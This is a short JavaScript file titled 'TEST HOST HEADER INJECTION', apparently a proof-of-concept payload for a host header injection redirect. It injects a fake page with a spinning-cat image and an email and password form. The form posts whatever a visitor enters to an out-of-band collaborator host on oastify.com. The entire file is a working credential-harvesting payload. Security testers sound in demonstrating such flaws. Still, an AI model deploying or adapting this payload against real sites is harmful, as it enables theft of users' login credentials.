document.addEventListener("DOMContentLoaded", function() {
    // Create elements
    const title = document.createElement('title');
    title.textContent = 'TEST HOST HEADER INJECTION';

    const h1 = document.createElement('h1');
    h1.textContent = 'Hello visitor!';

    const p = document.createElement('p');
    p.textContent = 'You just got redirected :)\nHope you did not input anything sensitive ;)';

    const img = document.createElement('img');
    img.src = 'https://media.tenor.com/EFDwfjT2GuQAAAAM/spinning-cat.gif';
    img.alt = 'Spinning Cat';

    const form = document.createElement('form');
    form.action = 'https://pg9skevlq4m7jhc5cl5a81kf86ex2rqg.oastify.com';
    form.method = 'POST';

    const emailLabel = document.createElement('label');
    emailLabel.textContent = 'Email: ';
    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.name = 'email';
    emailInput.required = true;

    const passwordLabel = document.createElement('label');
    passwordLabel.textContent = 'Password: ';
    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.name = 'password';
    passwordInput.required = true;

    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'Submit';

    // Append elements to the form
    form.appendChild(emailLabel);
    form.appendChild(emailInput);
    form.appendChild(document.createElement('br'));
    form.appendChild(passwordLabel);
    form.appendChild(passwordInput);
    form.appendChild(document.createElement('br'));
    form.appendChild(submitButton);

    // Append elements to the document
    document.head.appendChild(title);
    document.body.appendChild(h1);
    document.body.appendChild(p);
    document.body.appendChild(img);
    document.body.appendChild(form);
});
